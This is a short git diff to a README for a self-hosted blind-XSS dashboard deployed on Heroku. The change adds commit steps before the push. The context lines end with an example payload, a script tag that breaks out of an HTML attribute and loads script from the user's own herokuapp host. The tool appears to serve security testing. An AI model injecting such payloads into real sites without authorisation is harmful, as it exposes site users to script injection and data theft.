@@ -21,6 +21,8 @@ $ heroku addons:create heroku-postgresql:hobby-dev
 ```
 Modify the file `config.py` with a username/password of your choice (used to access your dashboard), change the domain for your *name_of_your_app.herokuapp.com*, and finally:
 ```
+$ git add .
+$ git commit -m "letsgo"
 $ git push heroku master
 ```
 That's it! Now you have your own dashboard in *name_of_your_app.herokuapp.com/dashboard* and you just have to use your favorite payload like `"><script src="https://name_of_your_app.herokuapp.com"></script>` to find blind XSS.
